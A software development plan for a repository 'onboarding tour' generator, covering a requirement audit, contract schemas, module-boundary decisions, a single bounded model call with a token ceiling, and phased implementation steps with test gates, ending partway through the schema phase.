# Onboarding Generator — Development Plan

**Spec:** `specs/12-onboarding-generator.md` (draft, committed `c0c750d`; supersedes `specs/11-onboarding-tour.md`)
**Execution mode:** parallel tracks — one server track and one client track, after a four-phase single-threaded trunk

## Goal / Done when

A developer who opens `/repos/:repoId/tour` on an imported, indexed repository sees five sections — architecture, critical paths, how to run, guided reading, first tasks — built from a **deterministic skeleton the server derives in code**, optionally annotated by **exactly one** structured model call whose prose is merged onto that skeleton by server-supplied id; where every path resolves against the index at render time, every command is a verbatim member of a whitelist derived from that repo's own config files, every difficulty label carries the caller count and rank percentile it was computed from, the reading list is emitted in descending `file_rank` order regardless of what the model returned, and a failed, timed-out, over-budget or key-less call yields a `200` page that still teaches — where today `getCriticalPaths`, `getTopFilesByRank`, the `Onboarding*` contracts, the `onboarding` table, the `onboarding` feature-model entry, `server/src/prompts/onboarding.system.md` and `client/messages/en/onboarding.json` all exist with **no call site whatsoever**.

---

## Requirement audit

Read adversarially against the code on `task/11-onboarding-tour` at `c0c750d`. Spec 12 already absorbed three of `plans/11-onboarding-tour.plan.md`'s audit findings (the `activeKeyFor` defect is now R20; the `toJsonSchema` ambiguity is closed by R14's *"serialized by the same `toJsonSchema` the adapters use"*; the `PRICING` correction is stated at `:51`). What remains is below. **No blocking questions.**

| Requirement | Problem | Effect on this plan |
| --- | --- | --- |
| `specs/12-onboarding-generator.md:159` (R2), `:160` (R3), `:167` (R10), `:168` (R11), `:313` (module-interaction row) | **Not buildable as written — re-verified on this branch.** `RepoIntel` (`server/src/modules/repo-intel/types.ts:137-171`) exposes exactly `indexRepo`, `refreshIndex`, `getIndexState`, `getBlastRadius`, `getRepoMap`, `getFileRank`, `getSymbolsInFiles`, `getCallerSignatures`, `getUnresolvedReferences`, `getConventionSamples`, `getTopFilesByRank`, `getCriticalPaths`. It has **no** way to obtain (a) the full indexed file list, (b) `file_edges`, (c) `file_facts`. All three are on `RepoIntelRepository`: `getEdges` (`repo-intel/repository.ts:432`), `getRankedPaths` (`:449`), `getFileFacts` (`:534`). `no-cross-module-internals` (`.dependency-cruiser.cjs:70-80`) forbids `modules/tour/` importing any of them, and `tsPreCompilationDeps: true` (`:113`) means `import type` counts too. `getFileRank` **takes** a path list, so it cannot produce R10/R11's reference set. | **Resolved in-plan, Phase T2:** three read-only passthroughs on the `RepoIntel` facade — `getIndexedFiles`, `getFileEdges`, `getFileFacts` — carrying the same `repoIntelEnabled` + degraded-empty guard the neighbouring reads use. Trunk phase, because it edits `modules/repo-intel/**`, which no track owns. |
| `:316` (module-interaction row: *"tour service → project-context discovery: `discoverDocuments(root)`"*), `:200` (P6) | **Trips `pnpm arch`.** `discoverDocuments` is `server/src/modules/project-context/discovery.ts:38`; `modules/tour/` importing it is the same `no-cross-module-internals` violation `plans/09-project-context.plan.md` T3 hit with `EXCLUDED_DIRS` and `plans/10-pr-brief.plan.md` C-1 hit with `classifyPath`. | **Resolved in-plan, Phase T2:** move `discoverDocuments` + `DiscoveredDoc` + `DiscoveryResult` to `server/src/modules/_shared/doc-discovery.ts`; `project-context/discovery.ts` becomes a re-export. Third instance of a precedent already twice applied — `_shared/walk-limits.ts` and `_shared/file-roles.ts` are both in `ls server/src/modules/_shared/`. |
| `:500` (Q8) — *"Default: no, not yet"* on A-3's `× 2` billing factor | **Contradicts a measured insight recorded on the same day as the spec.** `server/INSIGHTS.md:304-318` (2026-08-26): the serialized `Brief` JSON schema is 456 tokens of a 1 394-token gap, so *"a gate that counts the schema and stops is still unsound, just less so"*; what shipped is `system + user + briefSchemaEnvelope()` **scaled by `BRIEF_BILLING_SAFETY_FACTOR = 2`** (`server/src/modules/brief/constants.ts:33`). R14 as written re-adopts the shape that insight explicitly calls unsound. | **Assumed as the spec's stated default** — raw count plus the serialized schema, ceiling 12 000, **no** safety factor. The ceiling therefore means "pre-flight floor", not "billed". Named in *Recommendations* and in R14's constant's doc comment so the next reader does not mistake it for a billed ceiling. A18's warn-log is what makes the residual visible. **This is a human's to overturn; the implementer does not re-litigate it inside a phase.** |
| `:173` (R16) cites `onboarding.system.md:9-11`; `:370` (C10) cites `:31-34`; `:396` (i18n NFR) cites `:45-47` | **Line citations are off; one points past the end of a 44-line file.** Actual: SECURITY paragraph `:11-12`, grounding rules `:14-18`, mermaid rules `:29-36`, `diagram: null` rule `:35-36`, output format `:38-40`, do-not-translate `:42-44`. | No behavioural effect. This plan cites the real lines. Flagged so the implementer does not conclude the file was replaced and rewrite it from scratch, losing the SECURITY paragraph R16 depends on. |
| `server/src/prompts/onboarding.system.md:42` | **An input the spec never mentions.** The template carries a second placeholder, `{{language}}`, alongside `{{sections}}`. `renderTemplate` (`server/src/platform/prompts.ts:33-37`) leaves an unsupplied placeholder **intact**, so omitting it ships the literal `{{language}}` to the model. | **Assumed as:** Phase A3 supplies `language: 'English'`. Asserted in `tour-prompt.test.ts` — the rendered system prompt contains no `{{`. |
| `:174` (R17) — *"no provider key … writes a record with `degraded: true`"* | Correct as a requirement, but the mechanism is not obvious: `container.llm(provider)` throws a `ConfigError` **before** any call, and the house helper `withFeatureProviderContext` (`server/src/modules/_shared/provider-errors.ts:48-62`) **re-throws** it with actionable text. A route that lets it propagate is a `5xx`, which R17 forbids. | **Decided, Phase A4:** the service wraps model resolution + call in `withFeatureProviderContext({ id: 'onboarding', label: 'Onboarding Tour', … })`, then **catches `ConfigError`** and persists the skeleton with that helper's message as `error`. The wrapper is kept for the message, not the throw. |
| `:351` (Contract changes) — *"Whether that is a migration on `onboarding` or a new table is the planner's call"* | Decision required, not a defect. | **Decided, Phase T3:** a **new** table `onboarding_tours`; the dead `onboarding` table (`server/src/db/schema/context.ts:120-126`, zero producers, zero consumers) is left untouched — mirroring `plans/10-pr-brief.plan.md`'s treatment of `pr_brief` vs `pr_brief_records`. Every R12 key component is **non-null** (`repo_index_state.lastIndexedSha` `notNull`, `schema/repo-intel.ts:39`; `indexerVersion` `notNull` integer, `:40`; the rest ints and text), so this table gets a plain composite **primary key** and a **native `onConflictDoUpdate`** — it does not inherit the `COALESCE` partial index and non-atomic select-then-write `server/INSIGHTS.md:319-332` records against `pr_brief_records`. |
| `:422` (A18) — *"within 15 % of `budget_tokens`, or … logged at `warn`"* | **Not checkable hermetically.** Only a real provider reports `usage.input_tokens`; a mock returns what the fixture says. The spec concedes this in its own *Verify by*. | **Assumed as:** the criterion splits. The **helper** `compareBudgetToBilled(budget, tokensIn) → { ratio, withinTolerance }` is hermetic and boundary-tested (Phase A4). The **measurement** is J1's manual step, read back by SQL. No test claims to have verified the ratio. |
| `:405`–`:431` (A12, A13, A14, A22) — *"`e2e/specs/13-onboarding-tour.flow.json`"* | **Correct on this branch.** `ls e2e/specs/` — `12-pr-brief.flow.json` exists; `13-` is free. (It was wrong when plan 11 was written; the brief flow has since landed.) | No effect. J1 creates `e2e/specs/13-onboarding-tour.flow.json`. |
| `client/messages/en/onboarding.json:4` — `"sectionCount": "{count} sections"` | Pre-existing defect the i18n NFR (`:396`) names in principle but does not attribute. A bare `{count}` is string interpolation, not number formatting (`client/INSIGHTS.md:326-337`). | Fixed in Phase B1 as part of R21's rewrite. One line. |
| `CLAUDE.md` — *"`server pnpm arch` ignores an **11**-entry known-violations file"* | **Stale.** `server/.dependency-cruiser-known-violations.json` holds **10** entries. `plans/10-pr-brief.plan.md` recorded the same correction and it was never folded back. | Every gate below reads "the **10**-violation baseline". Recorded as an insight at J2. |
| `:496` (Q4) — the `onboarding` default is `openrouter`/`deepseek/deepseek-v4-flash` | **Not runnable on this machine.** `~/.devdigest/secrets.json` holds exactly `ANTHROPIC_API_KEY`, `GITHUB_TOKEN`, `OPENAI_API_KEY`. `OPENROUTER_API_KEY` is absent, so the default resolves to a provider with no key. The model **is** priced (`server/src/adapters/llm/pricing.ts:52`, `{ in: 0.14, out: 0.28 }`), so the spec's correction of spec 11 holds. | **Assumed as, Phase J1 (see *Demonstrating the default model*):** the default is **kept unchanged**, and the missing key is used as a *free live demonstration of R24* — a generation on the default produces a real skeleton with an actionable `error`, which is A9's success path in production form. The **annotated** path is demonstrated by a workspace feature-model override to `anthropic` in Settings → Feature Models; because `provider` and `model` are R12 key components, switching is a natural cache miss and needs no `force`. Adding an OpenRouter key is a CTO action, not a phase. |

---

## Context read

| Source | What it settled |
| --- | --- |
| `specs/12-onboarding-generator.md:1-536` | The requirement set. One call (R7), the deterministic skeleton (R24), one 12 000 ceiling (R14), one trace block (R15), five sections. It is the input; nothing below invents a requirement. |
| `specs/12-onboarding-generator.md:20-51` | Why this supersedes 11, and the two spec-11 claims re-verified. Spec 12 wins on every disagreement. |
| `plans/11-onboarding-tour.plan.md:18-31` | The prior audit. Rows 1 and 2 re-verified above and carried forward; rows 3, 4 and 6 are now closed by spec 12 itself. |
| `server/src/modules/repo-intel/types.ts:137-171` | The full facade surface, and the three reads it lacks. Forces T2. |
| `server/src/modules/repo-intel/repository.ts:432,449,534` | `getEdges`, `getRankedPaths`, `getFileFacts` — the three bodies T2's passthroughs delegate to. All written, all indexed. |
| `server/src/modules/repo-intel/service.ts:670-713` | `getCriticalPaths` — greedy highest-ranked import target from the top `CRITICAL_PATH_ROOTS = 5` roots (`:713`), `BFS_DEPTH = 2` (`constants.ts:51`). Returns `string[][]` — **paths only, no endpoints**; R3's annotation is the tour's own join against `file_facts`. |
| `server/src/modules/repo-intel/service.ts:646-663` | `getTopFilesByRank` over-fetches, drops junk paths, and honours `exclude` as a **substring** match — not a path match. |
| `server/src/modules/repo-intel/service.ts:585-634` | `getUnresolvedReferences` **takes a file list** and re-parses the clone per file. R8's generator must feed it a bounded list or it walks the repo. |
| `server/src/db/schema/repo-intel.ts:35-48` | `repo_index_state`: `lastIndexedSha` `notNull`, **`indexerVersion` `notNull` integer**, status enum `full|partial|degraded|failed`, `filesSkipped`. Both R12 key components exist and are non-null. |
| `server/src/db/schema/repo-intel.ts:55-68,75-88,105-121` | `file_edges`, `file_facts` (`endpoints`/`crons`), `file_rank` (`percentile` smallint `notNull`, one row per indexed file). |
| `server/src/modules/repo-intel/constants.ts:16,37` | `SUPPORTED_EXT` = six JS/TS extensions (C3 is real and total). `INDEXER_VERSION = 2`. |
| `server/src/db/schema/context.ts:120-126` | The `onboarding` table: `repo_id` PK, `json`, `generated_at`. Cannot express R12. Dead. |
| `server/src/vendor/shared/contracts/knowledge.ts:28-47` | `OnboardingLink`, `OnboardingSection` (`kind: z.string()`, `body: z.string()` — **not** nullable today), `Onboarding`. The shapes R19 extends. |
| `server/src/vendor/shared/contracts/platform.ts:43-50` · `client/src/lib/feature-models.ts:13-20` | The `onboarding` feature-model entry, identical in both trees. **Unchanged by this feature.** The client mirror is hand-maintained and outside `check-shared.sh` — irrelevant here, since nothing changes. |
| `server/src/modules/_shared/feature-models.ts:55-62` | `resolveFeatureModel(container, workspaceId, id)` — workspace override, else registry default. A permitted `_shared` target. |
| `server/src/modules/_shared/provider-errors.ts:48-62` | `withFeatureProviderContext` turns "OPENROUTER_API_KEY is not configured" into an actionable sentence naming Settings → Feature Models. It **re-throws**; the tour catches. |
| `server/src/adapters/llm/pricing.ts:52` | `'deepseek/deepseek-v4-flash': { in: 0.14, out: 0.28 }`. `cost_usd` is computable. |
| `server/src/platform/structured.ts:6-12` | `toJsonSchema` re-exported from `@devdigest/reviewer-core`. Importable from a module; R14's addend. |
| `server/src/modules/brief/routes.ts:28-53` | The precedent: `200 + null` GET, `rateLimit` on POST, `RunLogger(container.runBus, [], req.log, …)` fanned over zero runIds. Copy the shape; **import none of it**. |
| `server/src/prompts/onboarding.system.md:1-44` | 44 lines. SECURITY `:11-12`, grounding `:14-18`, mermaid `:29-36`, `diagram: null` `:35-36`, output format `:38-40`, `{{language}}` `:42`, do-not-translate `:42-44`. Names `routes_and_apis` at `:8,23-26` and tells the model to author the diagram at `:27` — **both contradict spec 12**. |
| `server/INSIGHTS.md:129-141` | The seeded demo cannot exercise `repo-intel` **at all**. Four of five sections are `repo-intel`-backed. A27 exists for this. |
| `server/INSIGHTS.md:286-318` | The brief's 612-vs-2 006 measurement **and** the 2026-08-26 follow-up: the schema is 456 of the 1 394 tokens, and what shipped scales by `BRIEF_BILLING_SAFETY_FACTOR = 2`. Audit row 3. |
| `server/INSIGHTS.md:319-332` | `onConflictDoUpdate` cannot target a `COALESCE` partial index. **Does not bite here** — every key column is non-null. |
| `server/INSIGHTS.md:333-344` | `MockGitClient.readFile` returns `''` and never throws, unlike `SimpleGitClient.readFile`. A C6 test on the base mock exercises the wrong branch and still passes. |
| `server/INSIGHTS.md:345+` | `text('col', { enum })` in Drizzle is TypeScript-only — no PG constraint. R19's five-value enum is an **application** claim, which is what A25 pins. |
| `server/src/adapters/git/simple-git.ts:128-131` | `readFile` is a bare `fs.readFile(join(clonePath, path))` — **throws ENOENT**, no traversal guard. Both are the tour service's problem. |
| `server/src/adapters/codeindex/ripgrep.ts:43-55` | `grep(repo, pattern)` — `@vscode/ripgrep` at runtime, pure-Node walk otherwise. Reached only via `container.codeIndex` (`injected-adapters-only-from-container` names the concrete class). |
| `server/.dependency-cruiser-known-violations.json` | **10** entries, not 11. |
| `client/src/vendor/ui/nav.ts:20-42` | `NAV`. `WORKSPACE` holds `pulls` and `context` only. The comment at `:33-35` forbids an entry before its screen exists. Vendored. |
| `client/src/components/app-shell/helpers.ts:25-40` | `activeKeyFor`. `:29` is `if (pathname.includes("/onboarding")) return "onboarding-tour";`, **above** the `/context` and `/conventions` cases. Confirmed live. |
| `client/messages/en/shell.json:19` | `nav["onboarding-tour"] = "Onboarding Tour"` already exists. |
| `client/messages/en/onboarding.json:1-17` | `generate.body:10` names five *different* sections; `sectionCount:4` carries a bare `{count}`. |
| `client/src/components/mermaid-diagram/MermaidDiagram.tsx:9-59` | Keyword regex **and** `mermaid.parse({suppressErrors:true})`, `securityLevel: "strict"`, returns `null` when invalid. A21 needs no new defence. |
| `client/src/lib/hooks/` | `agents`, `conventions`, `core`, `index`, `repo-intel`, `reviews`, `skills`, `trace`. `useRepoIntelStatus`/`useResyncRepoIntel` already exist — R13/R18's client half needs no new hook. |
| `client/INSIGHTS.md:162-174` | The "`NAV` is off-limits" entry (`:176-187`) **stopped holding**: `NAV` was edited deliberately for SKILLS LAB. R20's entry is precedented, not an escalation, and a route added without touching `NAV` is unreachable. |
| `client/INSIGHTS.md:326-337` | A bare `{count}` is string interpolation. |
| `client/INSIGHTS.md:386+` | Zero error boundaries in the client. A render throw blanks the page. |
| `INSIGHTS.md:337-353` | The two `@devdigest/shared` trees have drifted **non-additively** before. `check-shared.sh --fix` rsyncs server → client with `--delete`. |
| `INSIGHTS.md:356-369` | A spec amendment that changes a contract both sides encode lands on one side only, and each side's tests assert its own half. Put the assertion where both halves meet. |
| `INSIGHTS.md:370-381` | Making a shared array-item field required broke fixtures in modules the task never touched. Every added field here is `.optional()`/`.nullish()`. |
| `INSIGHTS.md:382-394` | Scope every phase gate (`--reporter=dot --exclude '**/*.it.test.ts'`); run the unfiltered suite once. |
| `INSIGHTS.md:395+` | A feature can ship **inert** — `modules/index.ts`, the hooks barrel, message keys, the prompt copy step. J1 step 7 exists only for this. |
| `e2e/specs/` | `12-pr-brief.flow.json` is the highest. `13-` is free. |
| `design-mocks/src/24-screen_tour_context.jsx:63-81` | The five section ids, the empty state, the header, the per-section shapes. |

---

## Prior art and rejected approaches

- **2026-08-13, `server/INSIGHTS.md:129-141` — the seeded demo repo cannot exercise `repo-intel`.** 283 green tests said nothing about whether blast radius worked. **Consequence:** four of five sections are `repo-intel`-backed, so a green suite plus a green e2e flow is compatible with the tour never having produced one real chain. **A27 is a phase step, not a suggestion.**
- **2026-08-19 + 2026-08-26, `server/INSIGHTS.md:286-318` — a pre-flight gate that counts only the prompt strings undercounts the bill by the structured-output envelope, and counting the schema closes only a third of it.** The brief shipped `schema envelope × BRIEF_BILLING_SAFETY_FACTOR = 2`. **Spec 12's Q8 deliberately does not import that factor** (audit row 3). Not retried; the difference is recorded rather than silently reconciled.
- **2026-08-18, `server/INSIGHTS.md:319-332` — `onConflictDoUpdate` cannot target a `COALESCE` partial index.** **Consequence:** `onboarding_tours`'s key is deliberately all-non-null so a native upsert is available; the brief's select-then-write is not inherited.
- **2026-08-09, `server/INSIGHTS.md` — exactly one token counter.** A second, cheaper estimator was rejected. R14's measurement is `container.tokenizer.count` and nothing else; **no client-side estimate anywhere**, including the CTA's "~12,000 tokens" copy, which is a static message string.
- **2026-08-09, `server/INSIGHTS.md` — do not put shared logic on a module's `service.ts` and expose it on the container.** **Consequence:** T2 extends the `RepoIntel` **facade interface**, the shape the container already exposes, rather than adding a `container.tourInputs` getter onto another module's service.
- **`plans/09-project-context.plan.md` T3 and `plans/10-pr-brief.plan.md` C-1 — the arch-legal answer to cross-module reuse is `modules/_shared/` plus a re-export from the original home.** Done twice (`walk-limits.ts`, `file-roles.ts`). **Consequence:** T2 does it a third time for `discoverDocuments`. Copying the walk instead is the rejected option — a drifted `EXCLUDED_DIRS` lists `node_modules`.
- **2026-08-19, `server/INSIGHTS.md:333-344` — `MockGitClient.readFile` never throws.** **Consequence:** C6 and `clone_unavailable` tests use a throwing subclass or they assert the wrong branch and still pass.
- **2026-08-10, `client/INSIGHTS.md:162-174` — the "`NAV` is off-limits" entry stopped holding.** **Consequence:** R20's entry is a normal, precedented, deliberate vendored edit. It still lands **with** the page (`nav.ts:33-35`).
- **2026-08-10, `client/INSIGHTS.md:386+` — zero error boundaries.** **Consequence:** every section renderer takes a defensive path for a missing payload; the skeleton path is the *normal* path, so it cannot be a `throw`.
- **`specs/08-blast-radius.md:56-59`, restated as spec 12 Trap 3 (`:446-450`)** — `modules/blast` is PR-scoped by design. **Not retried:** R9 uses `container.repoIntel.getBlastRadius(repoId, files)`.
- **`specs/09-project-context.md:61-63`** — chunking/embedding/retrieval rejected; no infrastructure exists to reuse. N7 restates it. **Not retried.**
- **`specs/11-onboarding-tour.md` R7's two concurrent calls** — superseded by spec 12 R7. **Not retried, and the plan-shape consequence is structural:** there is no `Promise.allSettled`, no per-call trace, no partial-generation state, and no `degraded_sections` derived from which call failed. `skeleton_sections[]` is derived from which response *keys* were usable.

No entry under any *What Doesn't Work* section contradicts this plan.

---

## Scope

**In:**
- `GET /repos/:id/tour` (`200` + `TourRecord | null`, with R11 read-time re-resolution) and `POST /repos/:id/tour` (`{force?}`, rate-limited 5/min).
- A new `server/src/modules/tour/` module: routes, service, repository, a pure derivation layer that **produces the complete skeleton**, a pure assembly layer, its **own** pure grounding, a pure step whitelist, a pure difficulty rubric, a pure annotation-merge, a pure read-time resolver, constants.
- Three additive read methods on the `RepoIntel` facade; the promotion of `discoverDocuments` to `modules/_shared/`.
- One new add-only table `onboarding_tours`, keyed by the R12 repo-state tuple as its primary key.
- **Exactly one** structured model call per generation, `maxRetries: 0`, `timeoutMs: 45_000`, `maxTokens: 2600`, one 12 000-token pre-flight ceiling.
- A rewrite of `server/src/prompts/onboarding.system.md` to the five agreed sections, with the diagram and the section *ordering* removed from the model's job.
- The page at `/repos/[repoId]/tour`, its **vendored** nav entry, the `activeKeyFor` repoint, and its empty / not-indexed / loading / **skeleton** / stale / per-section-empty / error states.
- Contract additions in `@devdigest/shared`.
- Hermetic server tests for grounding, whitelist, task selection, difficulty, budget, prompt wrapping, reading order, merge and the enum; DB-backed `*.it.test.ts` for cache, skeleton persistence, trace fields and rate limit; client tests for every state; one e2e flow; two manual generations.

**Out:**
- Everything in the spec's *Non-goals* `:114-127`.
- A `routes_and_apis` section (`:144-146`); its endpoint facts fold into *Critical paths*.
- The *Share link* control (Q1).
- The `/onboarding` add-repository wizard's behaviour — **except** the `helpers.ts:29` line that mis-attributes it to the tour's nav key (R20).
- Any change to `modules/blast`, `modules/brief`, `modules/project-context` (beyond the `_shared` re-export), or `reviewer-core`.
- Any change to `FEATURE_MODELS`, `client/src/lib/feature-models.ts`, or the registered default model (Q4).
- Adding `OPENROUTER_API_KEY` to `~/.devdigest/secrets.json`. A CTO action; J1 demonstrates without it.
- Automatic regeneration after a resync (Q6); a retention policy for `onboarding_tours`; `mcp/`; backfill.

---

## Contract changes

All in `server/src/vendor/shared/contracts/knowledge.ts`, extending `:28-47`, then mirrored by `./scripts/check-shared.sh --fix`. **The client copy is never hand-edited.** Phase T1, before any fan-out, and frozen thereafter.

```
OnboardingSectionKind = z.enum(['architecture_overview','critical_paths',
                                'how_to_run','guided_reading','first_tasks'])   // R19, A25
TourDifficulty        = z.enum(['low','medium','high'])                          // R9
TourDifficultyBasis   = { callers: number, rank_percentile: number|null,
                          signal: 'indexed' | 'no_index_signal' }                // R9

OnboardingSection = existing { kind → OnboardingSectionKind, title,
                      body: string|null,          // NARROWING→NULLABLE: R24 persists facts w/o prose
                      diagram: string|null, links: OnboardingLink[] }
                  + tree?:      { path, files, role_mix, top_file, note: string|null }[]
                  + paths?:     { chain_id, files: string[], endpoints: string[],
                                  why: string|null, resolved: boolean[] }[]
                  + run_steps?: { command, why: string|null }[]
                  + reading?:   { path, why: string|null, rank_percentile: number|null,
                                  resolved: boolean }[]
                  + tasks?:     { candidate_id, title, scope, why: string|null,
                                  difficulty: TourDifficulty,
                                  difficulty_basis: TourDifficultyBasis,
                                  resolved: boolean }[]
                  + empty_reason?: string|null      // C5, C6, C7
                  + skeleton?:     boolean          // C14 — this section has no prose

TourTrace = { budget_tokens: number, tokens_in: number|null, tokens_out: number|null,
              cost_usd: number|null, provider, model, prompt_version }           // R15, SINGLE

TourRecord = Onboarding.extend({
              repo_id, indexed_sha, indexer_version, prompt_version, provider, model,
              trace: TourTrace,
              degraded, error: string|null,
              skeleton_sections: OnboardingSectionKind[],
              dropped_inputs: string[], dropped_refs: number, dropped_steps: number,
              index_status, files_skipped, current_indexed_sha,   // R11/R13, filled at GET
              generated_at })
```

- **Shape change from spec 11, called out because it is the whole revision:** `trace` is **one block**, not `calls: { narrative, practical }`; `skeleton_sections` replaces `degraded_sections`. An implementer holding plan 11 will reach for the wrong shape.
- **All five payloads are `.optional()`; every scalar the record may not have is `.nullish()`** (`INSIGHTS.md:370-381`). Two changes are **narrowings**: `kind` (`z.string()` → enum) and `body` (`z.string()` → nullable). `OnboardingSection` has **zero** consumers today (grep `server/src` and `client/src`), so both should be free — **verify with `pnpm typecheck` in both trees in T1 rather than assuming.**
- `resolved` lives on the **contract**, not the client, because R11 computes it server-side at `GET` and section counts must exclude unresolved entries; a client that recomputes it can disagree with the count.
- `TourDifficulty` is deliberately **not** `RiskSeverity` — a starter task's difficulty is not a risk level (spec `:338-340`).
- **The model-facing schema is module-local** (`server/src/modules/tour/schemas.ts`), not in `@devdigest/shared`: `TourAnnotations` — the exact five-key object of R7 (`:164`), narrower than `TourRecord`. Its `tasks[]` entries carry `candidate_id`, `title`, `why` and **no `difficulty` field at all**, so R9's "any model `difficulty` is discarded" is structural rather than a filter someone can delete. Its `guided_reading` is a `path → why` shape that **cannot express an order** (R6, C17). Nothing outside the server ever parses it, and putting a prompt's shape on the client's wire is how it becomes load-bearing.
- `FEATURE_MODELS` and `FeatureModelId` are **unchanged**.

Consumers that follow: `server/src/modules/tour/**`, `client/src/lib/hooks/tour.ts`, `client/src/app/repos/[repoId]/tour/**`.

---

## Execution mode — recommendation and evidence

| Points to parallel tracks | Evidence here |
| --- | --- |
| Non-overlapping file sets | Track A writes only `server/src/modules/tour/**`, `server/src/modules/index.ts`, `server/src/adapters/tokenizer/index.ts` (doc comment), `server/test/tour*`. Track B writes only `client/**`. The two `git diff --name-only` lists cannot intersect. |
| Packages independent once the contract lands | Client tests mock `fetch`, so Track B goes green without Track A's route existing. Its only dependency is `TourRecord`, frozen at T1. Track B derives **nothing** — every number it renders (counts, difficulty, basis, `resolved`, dropped counts) is on the record. |
| Enough work that serialising it is the bottleneck | 24 requirements, 22 corner cases, 27 acceptance criteria, a new server module with five pure gates, three facade methods, a shared-module promotion, a schema change, a prompt rewrite, and a new client route tree with eight distinct states. ~30 new or changed files. |

| Points to a single implementer | Evidence here |
| --- | --- |
| Everything hangs off one shape still moving | Real: the five section payloads are the widest contract here, and Track A discovers their true shape while deriving. **Mitigated** by landing them at full fidelity in T1 from the spec's own field list (`:330-337`) and freezing; any post-fan-out change is a stop-the-world event, named at the sync point. |
| Two tracks would edit the same file | Only `@devdigest/shared`, edited in T1 and never again. |

**Recommendation: parallel tracks**, after a four-phase single-threaded trunk. The trunk is not negotiable: T2's facade change is what makes Track A compile at all, and two agents editing `vendor/shared` is the one failure this repo cannot absorb cheaply (`INSIGHTS.md:337-353`; `check-shared.sh --fix` rsyncs with `--delete`).

**Merging the two calls made the tracks *more* separable, not less.** Under spec 11 the client had to render a page where three sections were real and two were error cards. Under R24 there is exactly one render path — skeleton, optionally annotated — so Track B builds one component tree against one fixture shape and `skeleton: true` is a field, not a branch.

---

## Trunk — landed before any fan-out

Single-threaded, in order. No track starts until T4 is green.

### Phase T1 — Contracts

- **What lands:** every shape both tracks depend on exists in both `@devdigest/shared` trees, identical, with a five-value `kind` enum and a nullable `body`.
- **Tasks:**
  - **T1.1** — add `OnboardingSectionKind`, `TourDifficulty`, `TourDifficultyBasis`; narrow `OnboardingSection.kind` and `OnboardingSection.body`. → **A25**
  - **T1.2** — add the five optional payloads, `empty_reason`, `skeleton`, `TourTrace` (single block) and `TourRecord`. → **A17, A26**
  - **T1.3** — run `./scripts/check-shared.sh --fix` **once, here, and never again inside a track**; verify `diff -rq` is silent. → **A17** (the record the client parses is the record the server writes)
  - **T1.4** — contract test: all five kinds parse, `kind: 'not-a-section'` fails, a fully-populated record parses, and a **skeleton** record parses (`body: null` everywhere, `trace.tokens_in: null`, `skeleton_sections` all five). → **A25, A9, A17**
- **Files:** `server/src/vendor/shared/contracts/knowledge.ts` · `client/src/vendor/shared/**` (written by the script, never by hand) · `server/test/contracts.test.ts`
- **Governing skill:** — (contract only; neither architecture skill governs `vendor/shared`). **Decision:** the new shapes go in the **existing** `contracts/knowledge.ts` beside the `Onboarding*` triple they extend, **not** a new `contracts/tour.ts` — a `tour.ts` next to a `knowledge.ts` that already defines `OnboardingSection` is how the next reader imports the wrong one, which is the `pr_brief` / `pr_brief_records` lesson.
- **Gate:** `cd server && pnpm exec vitest run --reporter=dot --exclude '**/*.it.test.ts' test/contracts.test.ts 2>&1 | tail -n 20` · `cd server && pnpm typecheck` · `cd client && pnpm typecheck` · `./scripts/check-shared.sh` (bare form, must report no drift)
- **Done when:** T1.4 passes; `diff -rq client/src/vendor/shared server/src/vendor/shared` is silent; both `pnpm typecheck`s are green with the two narrowings in place.
- **Depends on:** nothing.
- **Commit:** `feat(shared): TourRecord, the five-section enum and a single trace block`

### Phase T2 — Facade reads and the shared discovery move

- **What lands:** the tour's derived inputs are reachable without a single cross-module import, and one document-discovery implementation exists. (**Audit rows 1 and 2; enables R2, R3, R6, R8, R10, R11, P6**)
- **Tasks:**
  - **T2.1** — three read-only passthroughs on the `RepoIntel` facade. → enables **A2, A9, A24**
    ```
    getIndexedFiles(repoId, limit?): Promise<string[]>              // → repo.getRankedPaths, path only
    getFileEdges(repoId): Promise<Array<{fromFile, toFile}>>        // → repo.getEdges
    getFileFacts(repoId, files): Promise<IndexerFileFactsRow[]>     // → repo.getFileFacts
    ```
  - **T2.2** — move `discoverDocuments`, `DiscoveredDoc`, `DiscoveryResult` to `server/src/modules/_shared/doc-discovery.ts`; `project-context/discovery.ts` becomes a re-export keeping its doc comment. → enables **A15** (P6 wrapping), **A4** (`undocumented_endpoint`)
  - **T2.3** — facade tests: real rows against a fixture repo, `[]` when `repoIntelEnabled` is false; `project-context`'s existing suite green with **no test file edited**.
- **Files:** `server/src/modules/repo-intel/types.ts` · `server/src/modules/repo-intel/service.ts` · `server/src/modules/_shared/doc-discovery.ts` (new) · `server/src/modules/project-context/discovery.ts` (re-export) · `server/test/repo-intel/*.test.ts`
- **Governing skill:** `onion-architecture`. **Decision:** these are **facade passthroughs, not new logic**. Each opens with the same two guards its neighbours use (`service.ts:426-429`): `if (!this.container.config.repoIntelEnabled) return []` and an empty-input short-circuit, so C3's zero-index repo and the seeded demo degrade to `[]` rather than throwing. They go on `RepoIntel` because that interface is **already** the sanctioned cross-module door — `modules/blast` and `modules/brief` both reach `repo-intel` only through it — and because the alternative, a `container.tourInputs` getter onto another module's service, is the shape `server/INSIGHTS.md` (2026-08-09) records as producing an unprotected cycle. `getIndexedFiles` is deliberately the ranked-path list, not new SQL: `file_rank` has one row per indexed file (`schema/repo-intel.ts:105-121`), so "ranked paths, no limit" **is** the indexed file list, and it is the reference set for R10 at write and R11 at read. Invoke the skill before writing the `_shared` re-export — this is the third promotion and the near-edge call is whether a re-export or a hard move is correct (it is a re-export; `project-context`'s importers and tests must not change).
- **Gate:** `cd server && pnpm exec vitest run --reporter=dot --exclude '**/*.it.test.ts' test/repo-intel test/project-context 2>&1 | tail -n 30` · `cd server && pnpm arch` · `cd server && pnpm typecheck`
- **Done when:** T2.3 passes; `pnpm arch` reports exactly the **10** baseline violations and nothing more.
- **Depends on:** T1.
- **Commit:** `feat(repo-intel): read methods for the indexed file list, edges and file facts`

### Phase T3 — Schema and migration

- **What lands:** `onboarding_tours` exists, keyed by the R12 repo-state tuple. (**R12, R15**)
- **Tasks:**
  - **T3.1** — add the table to `server/src/db/schema/context.ts`; register it in the `schema.ts` barrel. → enables **A1, A17**
  - **T3.2** — `pnpm db:generate` then `pnpm db:migrate`. → **A1, A17**
- **Files:** `server/src/db/schema/context.ts` (append) · `server/src/db/schema.ts` (barrel) · one **generated** file under `server/src/db/migrations/`
